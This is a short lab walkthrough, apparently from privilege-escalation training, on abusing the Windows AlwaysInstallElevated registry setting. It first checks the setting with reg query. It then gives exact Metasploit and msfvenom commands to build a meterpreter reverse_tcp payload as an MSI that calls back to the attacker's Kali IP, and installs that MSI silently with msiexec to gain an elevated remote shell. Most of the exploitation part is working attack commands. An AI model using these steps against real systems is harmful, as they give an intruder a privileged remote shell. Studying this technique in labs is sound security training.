## Registry Escalation - AlwaysInstallElevated

Detection

Windows VM

1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
2.From the output, notice that “AlwaysInstallElevated” value is 1.
3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
4.From the output, notice that “AlwaysInstallElevated” value is 1.

Exploitation

Kali VM

1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
7. Copy the generated file, setup.msi, to the Windows VM.

Windows VM

1.Place ‘setup.msi’ in ‘C:\Temp’.
2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi
